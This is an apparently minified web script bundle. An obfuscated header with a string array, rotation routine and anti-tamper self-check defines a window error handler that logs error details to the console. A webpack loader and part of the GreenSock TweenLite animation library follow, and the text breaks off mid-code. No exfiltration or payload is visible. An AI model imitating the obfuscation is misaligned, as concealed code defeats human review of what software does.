_0x5a5f0f=['vKmH','DKns','W4WLW4W','WQBdGmob','u0fy','Bg9N','hmo3bW','v3f5','iXGK','g8oMha','AZKQ','5yAP6zEw6kg1','WRddJIGhxbZdJgW+','kYKR','kcGO','C2vH','imkQwa','W5rAWRS','ufPv','WR7dQH7dKYddMe1z','W5y5Cmo3W6pcV8kkW7eb','5yE66zsz5yIx','sMrZ','WOZcPmo/','tW9y','W7FcUaC','mte4mde2oePjA3v0zq','Bgjv','C3rY','W708WO8','WOuoWPiutSklzMOLEmk1yq','W77cVdS','CwnT','WPhdV8o3','h8oBW7xdUdXXWRpdLG','ycNcNG','mNW0','mxWW','AGqN','zmk5WRi','uw5q','W4RdSd4','hvpdKq','Cgzu','CMnO','B25L','W43cR2m','iwKGWQddKmoatGRcPZddUW','6zEm6k2B6k2v','jNBdLtNdGSkhW5yR','WP4DWOC','tMXT','mtj2zhDVEKe','5yw76zEH5PAx','W7FdVWO','6zsz6k+V6k+M','wtr3','mtHoy3DNqNO','AvbJ','W5hcOKu','idhcUG','qCopW6K','WPdcRmoU','5yEa6zs15PEb','B21W','r2HZ','WQ/cM8ol','yxbW','mZaZmJvdC1rLELe','vmk4cG','tCoaW7ddP8oKwCohWRBdPSoWWR9dCW','5yw76zsv5yUK','p8kGxG','sCoQW7u','t2P5','DCoPDq','ENn0','ndi4nZqYmfPyAw9LvW','Dg9t','W4q1W5a','whjM','WR3dSCkD','DhjP','WPK1mG','mJCXnty4r3bnu0TH','W7bvfq','WO1HW7e','zMPu','W6XObG','Dwn0','W5jwhW','tfDZ','wmkHoZFcVmkjW4hdSG','6zsz6k+V5l+H','ntG5ndmYvwnqEMfq','wGOF','EgDr','5ywG6zs26koC','Fdn8','eSk7WRabfgjwEa7dKtRdMty','W61JWPq','W75sWOC','W7XQW7q','s8kSiW','W70CBq','lISP','auddJmoWl28kW63cRtWKkW','Evfn','y29U','mJGXmtC0qwjAtK5Z','W6NdSWu','zmo/uq','W7lcIhW','mNfYtLHjtW','cSk1W58','WRpdMCkl','xu4tWRvYW5tdPKG9WQ8ZW6TD','DwnM'];haydata_0x3ddf=function(){return _0x5a5f0f};return haydata_0x3ddf()}(function(_0x289309,_0x3f216a){var _0x6aabd3=haydata_0x3e62,_0x23d1ac=haydata_0x3e62,_0xe0f1ed=haydata_0x3e62,_0x32cb0e=haydata_0x3e62,_0x5bd130=haydata_0x3e62,_0x3896ac=haydata_0x45ac,_0xbc16fc=haydata_0x45ac,_0x28fa76=haydata_0x45ac,_0x209078=haydata_0x45ac,_0x5b046c=haydata_0x45ac,_0x2f6843=_0x289309();while(!![]){try{var _0x34f3eb=parseInt(_0x3896ac('0x1c8'))/(0x2a4+0xad9+-0x2*0x6be)*(parseInt(_0x6aabd3(0x1eb,'&vCE'))/(0x1ae1+-0x2b5+0x80e*-0x3))+parseInt(_0x6aabd3('0x1b3','#)al'))/(-0x1162+0x4fe*0x1+0xc67)*(-parseInt(_0x3896ac('0x1ab'))/(-0x1dd6+-0x3*0x38c+0x143f*0x2))+-parseInt(_0xe0f1ed('0x1fc','vcBc'))/(0x5c+-0x7b0+0x759*0x1)*(-parseInt(_0xe0f1ed('0x1e1','&n2O'))/(0x3b*-0xd+-0x1da5+-0x4a*-0x71))+parseInt(_0x6aabd3(0x1ba,'GY6%'))/(-0x1ce6+0x1*-0x5d5+0x22c2)+parseInt(_0x28fa76('0x1b5'))/(0x152c+0xb*0x31c+-0x3758)*(parseInt(_0x23d1ac(0x1fe,'QgUt'))/(-0x942+-0x2535*-0x1+-0x31a*0x9))+-parseInt(_0x209078('0x1a4'))/(0x1*-0xf89+-0xae7*-0x3+0x6*-0x2db)+-parseInt(_0x5bd130(0x1cb,'6z]X'))/(-0x1f4*0xa+-0xe31+-0x4*-0x871)*(-parseInt(_0x209078(0x201))/(-0xda*-0xf+0x80f*-0x1+-0x4ab));if(_0x34f3eb===_0x3f216a)break;else _0x2f6843['push'](_0x2f6843['shift']())}catch(_0x28a7c9){_0x2f6843['push'](_0x2f6843['shift']())}}}(haydata_0x3ddf,0x1a49*0x2+-0x4*-0x1a0ca+-0x22c08));var haydata_0x8bb0e6=function(){var _0x21bb2f=haydata_0x3e62,_0x1e69b1=haydata_0x3e62,_0x2772af=haydata_0x3e62,_0x1b7984=haydata_0x3e62,_0x257736=haydata_0x3e62,_0x3b1c8c=haydata_0x45ac,_0x49c853=haydata_0x45ac,_0x51a2ea=haydata_0x45ac,_0x1d816c=haydata_0x45ac,_0x46c4a5=haydata_0x45ac,_0x3c2fd5={};_0x3c2fd5[_0x3b1c8c(0x1a3)+'yM']=_0x49c853('0x1db')+_0x49c853(0x1c0)+_0x21bb2f(0x1f0,'U0bY')+_0x21bb2f(0x1ff,'&vCE'),_0x3c2fd5[_0x51a2ea(0x1b7)+'Er']=function(_0x277118,_0x441f2f){return _0x277118===_0x441f2f},_0x3c2fd5[_0x2772af('0x1f4','*F[x')+'iE']=_0x46c4a5('0x207')+'iN',_0x3c2fd5[_0x49c853(0x1d1)+'UO']=_0x46c4a5('0x1a7')+'ST',_0x3c2fd5[_0x1e69b1(0x1d7,'eKZs')+'LT']=_0x21bb2f(0x1ee,'4^6*')+'Mo',_0x3c2fd5[_0x1b7984('0x1c6','SZf9')+'DZ']=_0x51a2ea(0x1a1)+'Rg',_0x3c2fd5[_0x21bb2f(0x1fb,'(KaF')+'hT']=_0x257736(0x1de,'#AZp')+_0x3b1c8c(0x1b9)+_0x49c853('0x1f2'),_0x3c2fd5[_0x51a2ea('0x1e8')+'Qm']=_0x3b1c8c('0x204')+'情：',_0x3c2fd5[_0x1e69b1(0x1be,'6C[d')+'QT']=_0x3b1c8c(0x1e2)+'号：',_0x3c2fd5[_0x1d816c(0x20e)+'IB']=_0x1e69b1('0x20c','P9x5')+'件：',_0x3c2fd5[_0x49c853('0x200')+'wS']=_0x2772af(0x1d8,'EMF8')+'号：',_0x3c2fd5[_0x21bb2f(0x1af,'0KWT')+'aB']=_0x51a2ea('0x1b4')+'息：',_0x3c2fd5[_0x21bb2f('0x1a0','GY6%')+'tN']=function(_0x48dd39,_0x2b3e1d){return _0x48dd39!==_0x2b3e1d},_0x3c2fd5[_0x1d816c('0x1ae')+'ww']=_0x2772af('0x1e5','MNTP')+'WW',_0x3c2fd5[_0x2772af('0x1b6','eKZs')+'kB']=_0x1b7984(0x1bf,'4MC&')+'yb';var _0x29e84f=_0x3c2fd5,_0x1772b9=!![];return function(_0x3ea7b2,_0x24c79c){var _0x44226f=_0x46c4a5,_0x563d4f=_0x3b1c8c,_0x593f15=_0x49c853,_0x4c3e0f=_0x49c853,_0x29b541=_0x1d816c,_0x162b12=_0x257736,_0x28d788=_0x257736,_0x3739e7=_0x257736,_0x285fc8=_0x1e69b1,_0x43c76f=_0x1b7984;if(_0x29e84f[_0x162b12(0x1bc,'@jKn')+'tN'](_0x29e84f[_0x44226f(0x1ae)+'ww'],_0x29e84f[_0x162b12('0x1d5','wf0Z')+'kB'])){var _0x562f6e=_0x1772b9?function(){var _0x2fe4f9=_0x44226f,_0x40af1a=_0x44226f,_0x5073b4=_0x44226f,_0x3e6473=_0x44226f,_0x26865a=_0x44226f,_0xc44354=_0x28d788,_0x19033f=_0x28d788,_0x1801b8=_0x162b12,_0x4d5e15=_0x28d788,_0x5f59af=_0x162b12,_0x1b652b={};_0x1b652b[_0xc44354('0x199','xHni')+'Sk']=_0x29e84f[_0x19033f('0x1cf','J!$o')+'yM'];var _0x51e717=_0x1b652b;if(_0x29e84f[_0x2fe4f9(0x1b7)+'Er'](_0x29e84f[_0x40af1a(0x1f5)+'iE'],_0x29e84f[_0x5073b4('0x1d1')+'UO'])){var _0x3d7c6f=_0x267375[_0x40af1a('0x19a')+'ly'](_0x539cef,arguments);return _0x50618c=null,_0x3d7c6f}else{if(_0x24c79c){if(_0x29e84f[_0xc44354(0x1e6,'UTj9')+'Er'](_0x29e84f[_0x26865a('0x1ce')+'LT'],_0x29e84f[_0x2fe4f9('0x1f8')+'DZ']))return _0x4fbec2[_0x26865a('0x1a5')+_0x5073b4('0x1a9')+'ng']()[_0x5073b4('0x1dc')+_0x2fe4f9(0x1f9)](_0x51e717[_0x19033f('0x208','(KaF')+'Sk'])[_0x3e6473('0x1a5')+_0x2fe4f9('0x1a9')+'ng']()[_0x40af1a('0x1c3')+_0x2fe4f9('0x1e9')+_0x4d5e15(0x1d3,'#)al')+'or'](_0x354e87)[_0x1801b8(0x1e4,'xHni')+_0x2fe4f9(0x1f9)](_0x51e717[_0x2fe4f9(0x1df)+'Sk']);else{var _0xcd9efd=_0x24c79c[_0x19033f(0x1a2,'SZf9')+'ly'](_0x3ea7b2,arguments);return _0x24c79c=null,_0xcd9efd}}}}:function(){};return _0x1772b9=![],_0x562f6e}else{var _0xec1f32=_0x29e84f[_0x563d4f('0x1b2')+'hT'][_0x3739e7('0x1c7','(KaF')+'it']('|'),_0x1bc3d1=0x17*-0x24+-0x1e91*0x1+-0x11*-0x1fd;while(!![]){switch(_0xec1f32[_0x1bc3d1++]){case'0':_0x31be60[_0x44226f(0x1d2)](_0x29e84f[_0x593f15(0x1e8)+'Qm'],_0x318913);continue;case'1':_0x17e961[_0x3739e7('0x1cd','P9x5')](_0x29e84f[_0x43c76f('0x1bd','pRx3')+'QT'],_0x7302cb);continue;case'2':_0x52dd7b[_0x285fc8('0x19f','EMF8')](_0x29e84f[_0x4c3e0f('0x20e')+'IB'],_0x1e935d);continue;case'3':_0x540fb5[_0x162b12(0x1bb,'bLZT')](_0x29e84f[_0x3739e7('0x1b1','0KWT')+'wS'],_0xfc2c6b);continue;case'4':_0xe9ec72[_0x43c76f(0x203,'qj]J')](_0x29e84f[_0x285fc8(0x209,'Vawk')+'aB'],_0x17b384);continue}break}}}}(),haydata_0x1ed2e5=haydata_0x8bb0e6(this,function(){var _0x2bec0a=haydata_0x45ac,_0x9782e0=haydata_0x45ac,_0x5b7601=haydata_0x45ac,_0x85166f=haydata_0x45ac,_0x44aaa9=haydata_0x45ac,_0x48d539=haydata_0x3e62,_0x5eaa59=haydata_0x3e62,_0x2d03af=haydata_0x3e62,_0x46b6fc=haydata_0x3e62,_0x31e906=haydata_0x3e62,_0x29ba93={};_0x29ba93[_0x48d539(0x20b,'xHni')+'fV']=_0x5eaa59('0x20a','Rw&D')+_0x48d539(0x1f6,'MKNM')+_0x2bec0a('0x1da')+_0x46b6fc('0x1f7','Tqms');var _0x5445d7=_0x29ba93;return haydata_0x1ed2e5[_0x9782e0('0x1a5')+_0x9782e0(0x1a9)+'ng']()[_0x48d539(0x1dd,'EMF8')+_0x48d539(0x1c5,'qj]J')](_0x5445d7[_0x85166f(0x20d)+'fV'])[_0x85166f(0x1a5)+_0x5b7601('0x1a9')+'ng']()[_0x2d03af(0x1ca,'CigU')+_0x5eaa59(0x1d0,'TtuH')+_0x2bec0a('0x1b0')+'or'](haydata_0x1ed2e5)[_0x46b6fc(0x1dd,'EMF8')+_0x48d539(0x1a6,'J!$o')](_0x5445d7[_0x2bec0a('0x20d')+'fV'])});haydata_0x1ed2e5(),window[haydata_0x3564d8(0x1fa)+haydata_0x419063(0x1d6,'#)al')+'r']=function(_0xef1722,_0x1e5933,_0x4e0b51,_0x217f41,_0x2d1412){var _0x40787b=haydata_0x419063,_0x538cce=haydata_0x419063,_0x24f56f=haydata_0x419063,_0x454573=haydata_0x419063,_0x3c2d11=haydata_0x419063,_0x4376dc=haydata_0x3564d8,_0x41e67d=haydata_0x3564d8,_0x123db0=haydata_0x3564d8,_0x4775bb=haydata_0x3564d8,_0xb7b437=haydata_0x3564d8,_0xa8e201={};_0xa8e201[_0x4376dc('0x1d4')+'GP']=_0x40787b(0x1aa,'4MC&')+_0x40787b('0x1ea','bLZT')+_0x41e67d(0x1f1),_0xa8e201[_0x123db0('0x1c2')+'iU']=_0x40787b(0x1b8,'pRx3')+'号：',_0xa8e201[_0x40787b('0x1ec','UTj9')+'IP']=_0x40787b('0x202','(KaF')+'件：',_0xa8e201[_0x24f56f('0x1ad','#AZp')+'gR']=_0x3c2d11('0x19e','bLZT')+'号：',_0xa8e201[_0x41e67d(0x1e3)+'Rs']=_0x4775bb('0x1b4')+'息：',_0xa8e201[_0x123db0('0x1cc')+'cA']=_0x3c2d11('0x1fd','TtuH')+'情：';var _0x93f9a5=_0xa8e201,_0x1c41b9=_0x93f9a5[_0x41e67d(0x1d4)+'GP'][_0x538cce('0x205','MNTP')+'it']('|'),_0x5a8f4c=0x4*-0x18d+-0x378+0x26b*0x4;while(!![]){switch(_0x1c41b9[_0x5a8f4c++]){case'0':console[_0x41e67d('0x1d2')](_0x93f9a5[_0x3c2d11(0x19c,'6C[d')+'iU'],_0x4e0b51);continue;case'1':console[_0x40787b(0x1f3,'mp8Z')](_0x93f9a5[_0x123db0(0x1ed)+'IP'],_0x1e5933);continue;case'2':console[_0x4376dc(0x1d2)](_0x93f9a5[_0x24f56f(0x1a8,'CigU')+'gR'],_0x217f41);continue;case'3':console[_0x40787b('0x1ac','0KWT')](_0x93f9a5[_0x3c2d11(0x1c9,'VAAg')+'Rs'],_0xef1722);continue;case'4':console[_0x123db0(0x1d2)](_0x93f9a5[_0x123db0(0x1cc)+'cA'],_0x2d1412);continue}break}};function i(n){if(t[n])return t[n].exports;var r=t[n]={i:n,l:!1,exports:{}};return e[n].call(r.exports,r,r.exports,i),r.l=!0,r.exports}i.m=e,i.c=t,i.d=function(e,t,n){i.o(e,t)||Object.defineProperty(e,t,{enumerable:!0,get:n})},i.r=function(e){"undefined"!=typeof Symbol&&Symbol.toStringTag&&Object.defineProperty(e,Symbol.toStringTag,{value:"Module"}),Object.defineProperty(e,"__esModule",{value:!0})},i.t=function(e,t){if(1&t&&(e=i(e)),8&t)return e;if(4&t&&"object"==typeof e&&e&&e.__esModule)return e;var n=Object.create(null);if(i.r(n),Object.defineProperty(n,"default",{enumerable:!0,value:e}),2&t&&"string"!=typeof e)for(var r in e)i.d(n,r,function(t){return e[t]}.bind(null,r));return n},i.n=function(e){var t=e&&e.__esModule?function(){return e.default}:function(){return e};return i.d(t,"a",t),t},i.o=function(e,t){return Object.prototype.hasOwnProperty.call(e,t)},i.p="",i(i.s=9)}([function(e,t,i){"use strict";(function(e,n){i.d(t,"f",(function(){return r})),i.d(t,"e",(function(){return o})),i.d(t,"h",(function(){return a})),i.d(t,"g",(function(){return o})),i.d(t,"a",(function(){return c})),i.d(t,"b",(function(){return l})),i.d(t,"c",(function(){return h})),i.d(t,"d",(function(){return u}));var r="undefined"!=typeof window?window:e.exports&&void 0!==n?n:{},o=function(e){var t={},i=e.document,n=e.GreenSockGlobals=e.GreenSockGlobals||e;if(n.TweenLite)return n.TweenLite;var r,o,a,s,c,l,h,u=function(e){var t,i=e.split("."),r=n;for(t=0;t<i.length;t++)r[i[t]]=r=r[i[t]]||{};return r},d=u("com.greensock"),p=function(e){var t,i=[],n=e.length;for(t=0;t!==n;i.push(e[t++]));return i},f=function(){},m=(l=Object.prototype.toString,h=l.call([]),function(e){return null!=e&&(e instanceof Array||"object"==typeof e&&!!e.push&&l.call(e)===h)}),v={},g=function(e,i,r,o){this.sc=v[e]?v[e].sc:[],v[e]=this,this.gsClass=null,this.func=r;var a=[];this.check=function(s){for(var c,l,h,d,p=i.length,f=p;--p>-1;)(c=v[i[p]]||new g(i[p],[])).gsClass?(a[p]=c.gsClass,f--):s&&c.sc.push(this);if(0===f&&r)for(h=(l=("com.greensock."+e).split(".")).pop(),d=u(l.join("."))[h]=this.gsClass=r.apply(r,a),o&&(n[h]=t[h]=d),p=0;p<this.sc.length;p++)this.sc[p].check()},this.check(!0)},y=e._gsDefine=function(e,t,i,n){return new g(e,t,i,n)},b=d._class=function(e,t,i){return t=t||function(){},y(e,[],(function(){return t}),i),t};y.globals=n;var w=[0,0,1,1],x=b("easing.Ease",(function(e,t,i,n){this._func=e,this._type=i||0,this._power=n||0,this._params=t?w.concat(t):w}),!0),_=x.map={},M=x.register=function(e,t,i,n){for(var r,o,a,s,c=t.split(","),l=c.length,h=(i||"easeIn,easeOut,easeInOut").split(",");--l>-1;)for(o=c[l],r=n?b("easing."+o,null,!0):d.easing[o]||{},a=h.length;--a>-1;)s=h[a],_[o+"."+s]=_[s+o]=r[s]=e.getRatio?e:e[s]||new e};for((a=x.prototype)._calcEnd=!1,a.getRatio=function(e){if(this._func)return this._params[0]=e,this._func.apply(null,this._params);var t=this._type,i=this._power,n=1===t?1-e:2===t?e:e<.5?2*e:2*(1-e);return 1===i?n*=n:2===i?n*=n*n:3===i?n*=n*n*n:4===i&&(n*=n*n*n*n),1===t?1-n:2===t?n:e<.5?n/2:1-n/2},o=(r=["Linear","Quad","Cubic","Quart","Quint,Strong"]).length;--o>-1;)a=r[o]+",Power"+o,M(new x(null,null,1,o),a,"easeOut",!0),M(new x(null,null,2,o),a,"easeIn"+(0===o?",easeNone":"")),M(new x(null,null,3,o),a,"easeInOut");_.linear=d.easing.Linear.easeIn,_.swing=d.easing.Quad.easeInOut;var S=b("events.EventDispatcher",(function(e){this._listeners={},this._eventTarget=e||this}));(a=S.prototype).addEventListener=function(e,t,i,n,r){r=r||0;var o,a,l=this._listeners[e],h=0;for(this!==s||c||s.wake(),null==l&&(this._listeners[e]=l=[]),a=l.length;--a>-1;)(o=l[a]).c===t&&o.s===i?l.splice(a,1):0===h&&o.pr<r&&(h=a+1);l.splice(h,0,{c:t,s:i,up:n,pr:r})},a.removeEventListener=function(e,t){var i,n=this._listeners[e];if(n)for(i=n.length;--i>-1;)if(n[i].c===t)return void n.splice(i,1)},a.dispatchEvent=function(e){var t,i,n,r=this._listeners[e];if(r)for((t=r.length)>1&&(r=r.slice(0)),i=this._eventTarget;--t>-1;)(n=r[t])&&(n.up?n.c.call(n.s||i,{type:e,target:i}):n.c.call(n.s||i))};var T=e.requestAnimationFrame,E=e.cancelAnimationFrame,A=Date.now||function(){return(new Date).getTime()},C=A();for(o=(r=["ms","moz","webkit","o"]).length;--o>-1&&!T;)T=e[r[o]+"RequestAnimationFrame"],E=e[r[o]+"CancelAnimationFrame"]||e[r[o]+"CancelRequestAnimationFrame"];b("Ticker",(function(e,t){var n,r,o,a,l,h=this,u=A(),d=!(!1===t||!T)&&"auto",p=500,m=33,v=function(e){var t,i,s=A()-C;s>p&&(u+=s-m),C+=s,h.time=(C-u)/1e3,t=h.time-l,(!n||t>0||!0===e)&&(h.frame++,l+=t+(t>=a?.004:a-t),i=!0),!0!==e&&(o=r(v)),i&&h.dispatchEvent("tick")};S.call(h),h.time=h.frame=0,h.tick=function(){v(!0)},h.lagSmoothing=function(e,t){if(!arguments.length)return p<1e8;p=e||1e8,m=Math.min(t,p,0)},h.sleep=function(){null!=o&&(d&&E?E(o):clearTimeout(o),r=f,o=null,h===s&&(c=!1))},h.wake=function(e){null!==o?h.sleep():e?u+=-C+(C=A()):h.frame>10&&(C=A()-p+5),r=0===n?f:d&&T?T:function(e){return setTimeout(e,1e3*(l-h.time)+1|0)},h===s&&(c=!0),v(2)},h.fps=function(e){if(!arguments.length)return n;a=1/((n=e)||60),l=this.time+a,h.wake()},h.useRAF=function(e){if(!arguments.length)return d;h.sleep(),d=e,h.fps(n)},h.fps(e),setTimeout((function(){"auto"===d&&h.frame<5&&"hidden"!==(i||{}).visibilityState&&h.useRAF(!1)}),1500)})),(a=d.Ticker.prototype=new d.events.EventDispatcher).constructor=d.Ticker;var P=b("core.Animation",(function(e,t){if(this.vars=t=t||{},this._duration=this._totalDuration=e||0,this._delay=Number(t.delay)||0,this._timeScale=1,this._active=!!t.immediateRender,this.data=t.data,this._reversed=!!t.reversed,Z){c||s.wake();var i=this.vars.useFrames?Y:Z;i.add(this,i._time),this.vars.paused&&this.paused(!0)}}));s=P.ticker=new d.Ticker,(a=P.prototype)._dirty=a._gc=a._initted=a._paused=!1,a._totalTime=a._time=0,a._rawPrevTime=-1,a._next=a._last=a._onUpdate=a._timeline=a.timeline=null,a._paused=!1;var L=function(){c&&A()-C>2e3&&("hidden"!==(i||{}).visibilityState||!s.lagSmoothing())&&s.wake();var e=setTimeout(L,2e3);e.unref&&e.unref()};L(),a.play=function(e,t){return null!=e&&this.seek(e,t),this.reversed(!1).paused(!1)},a.pause=function(e,t){return null!=e&&this.seek(e,t),this.paused(!0)},a.resume=function(e,t){return null!=e&&this.seek(e,t),this.paused(!1)},a.seek=function(e,t){return this.totalTime(Number(e),!1!==t)},a.restart=function(e,t){return this.reversed(!1).paused(!1).totalTime(e?-this._delay:0,!1!==t,!0)},a.reverse=function(e,t){return null!=e&&this.seek(e||this.totalDuration(),t),this.reversed(!0).paused(!1)},a.render=function(e,t,i){},a.invalidate=function(){return this._time=this._totalTime=0,this._initted=this._gc=!1,this._rawPrevTime=-1,!this._gc&&this.timeline||this._enabled(!0),this},a.isActive=function(){var e,t=this._timeline,i=this._startTime;return!t||!this._gc&&!this._paused&&t.isActive()&&(e=t.rawTime(!0))>=i&&e<i+this.totalDuration()/this._timeScale-1e-8},a._enabled=function(e,t){return c||s.wake(),this._gc=!e,this._active=this.isActive(),!0!==t&&(e&&!this.timeline?this._timeline.add(this,this._startTime-this._delay):!e&&this.timeline&&this._timeline._remove(this,!0)),!1},a._kill=function(e,t){return this._enabled(!1,!1)},a.kill=function(e,t){return this._kill(e,t),this},a._uncache=function(e){for(var t=e?this:this.timeline;t;)t._dirty=!0,t=t.timeline;return this},a._swapSelfInParams=function(e){for(var t=e.length,i=e.concat();--t>-1;)"{self}"===e[t]&&(i[t]=this);return i},a._callback=function(e){var t=this.vars,i=t[e],n=t[e+"Params"],r=t[e+"Scope"]||t.callbackScope||this;switch(n?n.length:0){case 0:i.call(r);break;case 1:i.call(r,n[0]);break;case 2:i.call(r,n[0],n[1]);break;default:i.apply(r,n)}},a.eventCallback=function(e,t,i,n){if("on"===(e||"").substr(0,2)){var r=this.vars;if(1===arguments.length)return r[e];null==t?delete r[e]:(r[e]=t,r[e+"Params"]=m(i)&&-1!==i.join("").indexOf("{self}")?this._swapSelfInParams(i):i,r[e+"Scope"]=n),"onUpdate"===e&&(this._onUpdate=t)}return this},a.delay=function(e){return arguments.length?(this._timeline.smoothChildTiming&&this.startTime(this._startTime+e-this._delay),this._delay=e,this):this._delay},a.duration=function(e){return arguments.length?(this._duration=this._totalDuration=e,this._uncache(!0),this._timeline.smoothChildTiming&&this._time>0&&this._time<this._duration&&0!==e&&this.totalTime(this._totalTime*(e/this._duration),!0),this):(this._dirty=!1,this._duration)},a.totalDuration=function(e){return this._dirty=!1,arguments.length?this.duration(e):this._totalDuration},a.time=function(e,t){return arguments.length?(this._dirty&&this.totalDuration(),this.totalTime(e>this._duration?this._duration:e,t)):this._time},a.totalTime=function(e,t,i){if(c||s.wake(),!arguments.length)return this._totalTime;if(this._timeline){if(e<0&&!i&&(e+=this.totalDuration()),this._timeline.smoothChildTiming){this._dirty&&this.totalDuration();var n=this._totalDuration,r=this._timeline;if(e>n&&!i&&(e=n),this._startTime=(this._paused?this._pauseTime:r._time)-(this._reversed?n-e:e)/this._timeScale,r._dirty||this._uncache(!1),r._timeline)for(;r._timeline;)r._timeline._time!==(r._startTime+r._totalTime)/r._timeScale&&r.totalTime(r._totalTime,!0),r=r._timeline}this._gc&&this._enabled(!0,!1),this._totalTime===e&&0!==this._duration||(I.length&&$(),this.render(e,t,!1),I.length&&$())}return this},a.progress=a.totalProgress=function(e,t){var i=this.duration();return arguments.length?this.totalTime(i*e,t):i?this._time/i:this.ratio},a.startTime=function(e){return arguments.length?(e!==this._startTime&&(this._startTime=e,this.timeline&&this.timeline._sortChildren&&this.timeline.add(this,e-this._delay)),this):this._startTime},a.endTime=function(e){return this._startTime+(0!=e?this.totalDuration():this.duration())/this._timeScale},a.timeScale=function(e){if(!arguments.length)return this._timeScale;var t,i;for(e=e||1e-8,this._timeline&&this._timeline.smoothChildTiming&&(i=(t=this._pauseTime)||0===t?t:this._timeline.totalTime(),this._startTime=i-(i-this._startTime)*this._timeScale/e),this._timeScale=e,i=this.timeline;i&&i.timeline;)i._dirty=!0,i.totalDuration(),i=i.timeline;return this},a.reversed=function(e){return arguments.length?(e!=this._reversed&&(this._reversed=e,this.totalTime(this._timeline&&!this._timeline.smoothChildTiming?this.totalDuration()-this._totalTime:this._totalTime,!0)),this):this._reversed},a.paused=function(e){if(!arguments.length)return this._paused;var t,i,n=this._timeline;return e!=this._paused&&n&&(c||e||s.wake(),i=(t=n.rawTime())-this._pauseTime,!e&&n.smoothChildTiming&&(this._startTime+=i,this._uncache(!1)),this._pauseTime=e?t:null,this._paused=e,this._active=this.isActive(),!e&&0!==i&&this._initted&&this.duration()&&(t=n.smoothChildTiming?this._totalTime:(t-this._startTime)/this._timeScale,this.render(t,t===this._totalTime,!0))),this._gc&&!e&&this._enabled(!0,!1),this};var R=b("core.SimpleTimeline",(function(e){P.call(this,0,e),this.autoRemoveChildren=this.smoothChildTiming=!0}));(a=R.prototype=new P).constructor=R,a.kill()._gc=!1,a._first=a._last=a._recent=null,a._sortChildren=!1,a.add=a.insert=function(e,t,i,n){var r,o;if(e._startTime=Number(t||0)+e._delay,e._paused&&this!==e._timeline&&(e._pauseTime=this.rawTime()-(e._timeline.rawTime()-e._pauseTime)),e.timeline&&e.timeline._remove(e,!0),e.timeline=e._timeline=this,e._gc&&e._enabled(!0,!0),r=this._last,this._sortChildren)for(o=e._startTime;r&&r._startTime>o;)r=r._prev;return r?(e._next=r._next,r._next=e):(e._next=this._first,this._first=e),e._next?e._next._prev=e:this._last=e,e._prev=r,this._recent=e,this._timeline&&this._uncache(!0),this},a._remove=function(e,t){return e.timeline===this&&(t||e._enabled(!1,!0),e._prev?e._prev._next=e._next:this._first===e&&(this._first=e._next),e._next?e._next._prev=e._prev:this._last===e&&(this._last=e._prev),e._next=e._prev=e.timeline=null,e===this._recent&&(this._recent=this._last),this._timeline&&this._uncache(!0)),this},a.render=function(e,t,i){var n,r=this._first;for(this._totalTime=this._time=this._rawPrevTime=e;r;)n=r._next,(r._active||e>=r._startTime&&!r._paused&&!r._gc)&&(r._reversed?r.render((r._dirty?r.totalDuration():r._totalDuration)-(e-r._startTime)*r._timeScale,t,i):r.render((e-r._startTime)*r._timeScale,t,i)),r=n},a.rawTime=function(){return c||s.wake(),this._totalTime};var k=b("TweenLite",(function(t,i,n){if(P.call(this,i,n),this.render=k.prototype.render,null==t)throw"Cannot tween a null target.";this.target=t="string"!=typeof t?t:k.selector(t)||t;var r,o,a,s=t.jquery||t.length&&t!==e&&t[0]&&(t[0]===e||t[0].nodeType&&t[0].style&&!t.nodeType),c=this.vars.overwrite;if(this._overwrite=c=null==c?X[k.defaultOverwrite]:"number"==typeof c?c>>0:X[c],(s||t instanceof Array||t.push&&m(t))&&"number"!=typeof t[0])for(this._targets=a=p(t),this._propLookup=[],this._siblings=[],r=0;r<a.length;r++)(o=a[r])?"string"!=typeof o?o.length&&o!==e&&o[0]&&(o[0]===e||o[0].nodeType&&o[0].style&&!o.nodeType)?(a.splice(r--,1),this._targets=a=a.concat(p(o))):(this._siblings[r]=J(o,this,!1),1===c&&this._siblings[r].length>1&&ee(o,this,null,1,this._siblings[r])):"string"==typeof(o=a[r--]=k.selector(o))&&a.splice(r+1,1):a.splice(r--,1);else this._propLookup={},this._siblings=J(t,this,!1),1===c&&this._siblings.length>1&&ee(t,this,null,1,this._siblings);(this.vars.immediateRender||0===i&&0===this._delay&&!1!==this.vars.immediateRender)&&(this._time=-1e-8,this.render(Math.min(0,-this._delay)))}),!0),O=function(t){return t&&t.length&&t!==e&&t[0]&&(t[0]===e||t[0].nodeType&&t[0].style&&!t.nodeType)};(a=k.prototype=new P).constructor=k,a.kill()._gc=!1,a.ratio=0,a._firstPT=a._targets=a._overwrittenProps=a._startAt=null,a._notifyPluginsOfEnabled=a._lazy=!1,k.version="2.1.3",k.defaultEase=a._ease=new x(null,null,1,1),k.defaultOverwrite="auto",k.ticker=s,k.autoSleep=120,k.lagSmoothing=function(e,t){s.lagSmoothing(e,t)},k.selector=e.$||e.jQuery||function(t){var n=e.$||e.jQuery;return n?(k.selector=n,n(t)):(i||(i=e.document),i?i.querySelectorAll?i.querySelectorAll(t):i.getElementById("#"===t.charAt(0)?t.substr(1):t):t)};var I=[],B={},D=/(?:(-|-=|\+=)?\d*\.?\d*(?:e[\-+]?\d+)?)[0-9]/gi,z=/[\+-]=-?[\.\d]/,F=function(e){for(var t,i=this._firstPT;i;)t=i.blob?1===e&&null!=this.end?this.end:e?this.join(""):this.start:i.c*e+i.s,i.m?t=i.m.call(this._tween,t,this._target||i.t,this._tween):t<1e-6&&t>-1e-6&&!i.blob&&(t=0),i.f?i.fp?i.t[i.p](i.fp,t):i.t[i.p](t):i.t[i.p]=t,i=i._next},N=function(e){return(1e3*e|0)/1e3+""},j=function(e,t,i,n){var 